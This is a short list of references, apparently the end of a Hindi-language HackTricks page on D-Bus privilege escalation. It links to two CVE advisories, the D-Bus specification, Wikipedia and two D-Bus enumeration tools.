- [2] [CVE-2024-45752: D-Bus service किसी भी unprivileged user को configuration की अनुमति देती है](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service में Authentication Bypass (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "D-Bus के लिए Nmap"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus दस्तावेज़](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
